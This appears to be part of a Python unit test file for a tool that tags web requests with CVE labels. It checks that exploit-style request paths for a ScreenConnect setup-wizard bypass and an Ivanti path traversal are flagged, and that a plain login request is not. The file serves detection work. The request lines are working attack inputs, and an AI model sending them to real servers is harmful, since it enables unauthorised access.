        self.assertIn(
            "cve-2024-1709-screenconnect",
            self._tags("GET /SetupWizard.aspx/theme/images/hero.jpg HTTP/1.1"),
        )

    def test_ivanti_totp_traversal_is_tagged(self):
        self.assertIn(
            "cve-2024-21887-ivanti",
            self._tags("GET /api/v1/totp/user-backup-code/../../license/keys-status/ HTTP/1.1"),
        )

    def test_ordinary_setupwizard_style_url_without_trailing_slash_is_not_flagged(self):
        # The vulnerable pattern requires the trailing-slash path-info suffix
        # after .aspx - a plain, already-authenticated request to the page
        # itself shouldn't match.
        self.assertNotIn("cve-2024-1709-screenconnect", self._tags("GET /Login.aspx HTTP/1.1"))


if __name__ == "__main__":
    unittest.main()
